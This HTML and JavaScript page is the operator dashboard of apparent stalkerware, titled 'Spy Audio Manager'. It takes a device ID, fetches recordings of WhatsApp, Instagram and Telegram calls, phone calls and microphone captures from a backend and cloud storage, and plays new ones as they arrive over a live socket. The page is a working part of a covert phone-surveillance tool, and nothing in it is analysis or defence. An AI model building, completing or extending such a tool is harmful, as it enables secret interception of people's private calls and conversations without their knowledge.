<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üïµÔ∏è‚Äç‚ôÇÔ∏è Spy Audio Manager</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script src="/socket.io/socket.io.js"></script>

    <style>
        :root {
            --bg: #0f172a;
            --card-bg: #1e293b;
            --accent: #ef4444; /* Red for Spy Theme */
            --text-main: #f8fafc;
            --text-sub: #94a3b8;
            --border: #334155;
        }

        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg);
            color: var(--text-main);
            margin: 0;
            padding: 20px;
        }

        /* --- Header & Search --- */
        .header {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
            gap: 15px;
        }

        h1 { margin: 0; font-size: 1.5rem; letter-spacing: 1px; }
        
        .search-box {
            display: flex;
            gap: 10px;
            width: 100%;
            max-width: 400px;
        }

        input {
            flex: 1;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid var(--border);
            background: var(--card-bg);
            color: white;
            outline: none;
        }

        button.load-btn {
            background: var(--accent);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
        }

        /* --- Tabs --- */
        .tabs {
            display: flex;
            gap: 10px;
            overflow-x: auto;
            padding-bottom: 10px;
            margin-bottom: 15px;
            justify-content: center;
        }

        .tab-btn {
            background: var(--card-bg);
            border: 1px solid var(--border);
            color: var(--text-sub);
            padding: 8px 16px;
            border-radius: 20px;
            cursor: pointer;
            white-space: nowrap;
            transition: 0.3s;
        }

        .tab-btn.active, .tab-btn:hover {
            background: var(--accent);
            color: white;
            border-color: var(--accent);
        }

        /* --- List Layout --- */
        .list-container {
            display: grid;
            grid-template-columns: 1fr;
            gap: 15px;
            max-width: 800px;
            margin: 0 auto;
        }

        /* --- Recording Card --- */
        .card {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            border-left: 4px solid var(--accent);
            animation: fadeIn 0.5s ease;
        }

        .card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .app-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .app-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            background: rgba(255,255,255,0.05);
        }

        .meta {
            display: flex;
            flex-direction: column;
        }

        .meta h3 { margin: 0; font-size: 16px; }
        .meta p { margin: 0; font-size: 12px; color: var(--text-sub); }

        audio {
            width: 100%;
            height: 35px;
            margin-top: 5px;
        }

        /* Status Bar */
        #status-bar {
            text-align: center;
            color: var(--text-sub);
            font-size: 14px;
            margin-top: 20px;
        }

        /* App Specific Colors */
        .whatsapp { color: #25D366; }
        .instagram { color: #C13584; }
        .telegram { color: #0088cc; }
        .call { color: #3b82f6; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Desktop View */
        @media (min-width: 768px) {
            .list-container {
                grid-template-columns: repeat(2, 1fr);
            }
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>üéß Audio Surveillance</h1>
        
        <div class="search-box">
            <input type="text" id="deviceIdInput" placeholder="Enter Device ID (e.g., RAHUL)">
            <button class="load-btn" onclick="fetchHistory()">Load</button>
        </div>
    </div>

    <div class="tabs">
        <button class="tab-btn active" onclick="filterBy('All')">All</button>
        <button class="tab-btn" onclick="filterBy('WhatsApp')"><i class="fab fa-whatsapp"></i> WA</button>
        <button class="tab-btn" onclick="filterBy('Instagram')"><i class="fab fa-instagram"></i> Insta</button>
        <button class="tab-btn" onclick="filterBy('Call')"><i class="fas fa-phone"></i> Calls</button>
        <button class="tab-btn" onclick="filterBy('Mic')"><i class="fas fa-microphone"></i> Mic</button>
    </div>

    <div id="status-bar">Waiting for input...</div>
    <div class="list-container" id="recordingsList"></div>

    <script>
        const socket = io();
        let allRecordings = [];
        let currentFilter = 'All';
        let currentDeviceId = '';

        // ‚úÖ 1. LIVE SOCKET LISTENER
        socket.on('new-audio', (data) => {
            console.log("üîä Live Audio Recieved:", data);
            
            // Check if matches current device ID (or if showing all)
            if(currentDeviceId && data.device_id !== currentDeviceId) return;

            const processed = {
                app: detectApp(data.name),
                date: new Date().toLocaleDateString(),
                time: new Date().toLocaleTimeString(),
                url: data.url,
                id: data.device_id
            };

            allRecordings.unshift(processed); // Add to top
            render();
            showStatus("‚ö° New Recording Received!");
        });

        // ‚úÖ 2. FETCH HISTORY FROM API
        async function fetchHistory() {
            const inputVal = document.getElementById('deviceIdInput').value.trim().toUpperCase();
            if(!inputVal) return alert("Please enter a Device ID!");

            currentDeviceId = inputVal;
            showStatus("üîÑ Fetching from server...");
            document.getElementById('recordingsList').innerHTML = ''; // Clear list

            try {
                // Call the new Backend API
                const res = await fetch(`/api/audio-history/${currentDeviceId}`);
                const data = await res.json();

                if(Array.isArray(data)) {
                    allRecordings = data.map(file => processCloudinaryFile(file));
                    render();
                    showStatus(`‚úÖ Loaded ${data.length} recordings.`);
                } else {
                    showStatus("‚ùå No recordings found.");
                    allRecordings = [];
                    render();
                }

            } catch (e) {
                console.error(e);
                showStatus("‚ùå Error fetching history.");
            }
        }

        // ‚úÖ 3. RENDER UI
        function render() {
            const container = document.getElementById('recordingsList');
            container.innerHTML = '';

            const filtered = allRecordings.filter(rec => 
                currentFilter === 'All' ? true : rec.app === currentFilter
            );

            if(filtered.length === 0) {
                container.innerHTML = `<p style="text-align:center; color:#666; width:100%;">No data found.</p>`;
                return;
            }

            filtered.forEach(rec => {
                const iconClass = rec.app.toLowerCase();
                const icon = getIcon(rec.app);

                const html = `
                    <div class="card">
                        <div class="card-header">
                            <div class="app-info">
                                <div class="app-icon ${iconClass}">
                                    <i class="${icon}"></i>
                                </div>
                                <div class="meta">
                                    <h3>${rec.app}</h3>
                                    <p>${rec.date} ‚Ä¢ ${rec.time}</p>
                                </div>
                            </div>
                        </div>
                        <audio controls controlsList="nodownload">
                            <source src="${rec.url}" type="audio/mp4">
                            <source src="${rec.url}" type="audio/mpeg">
                        </audio>
                    </div>
                `;
                container.innerHTML += html;
            });
        }

        // --- Helpers ---

        function processCloudinaryFile(file) {
            const d = new Date(file.created_at);
            return {
                app: detectApp(file.filename || file.public_id),
                date: d.toLocaleDateString(),
                time: d.toLocaleTimeString(),
                url: file.secure_url,
                id: currentDeviceId
            };
        }

        function detectApp(name) {
            if(!name) return "Call";
            name = name.toLowerCase();
            if(name.includes('whatsapp')) return 'WhatsApp';
            if(name.includes('instagram')) return 'Instagram';
            if(name.includes('telegram')) return 'Telegram';
            if(name.includes('mic')) return 'Mic';
            return 'Call';
        }

        function getIcon(app) {
            if(app === 'WhatsApp') return 'fab fa-whatsapp';
            if(app === 'Instagram') return 'fab fa-instagram';
            if(app === 'Mic') return 'fas fa-microphone';
            return 'fas fa-phone-alt';
        }

        function filterBy(filter) {
            currentFilter = filter;
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            render();
        }

        function showStatus(msg) {
            document.getElementById('status-bar').innerText = msg;
        }

        // Auto load if ID is in localStorage (Optional feature)
        const lastId = localStorage.getItem('last_device_id');
        if(lastId) {
            document.getElementById('deviceIdInput').value = lastId;
        }
    </script>

</body>
</html>
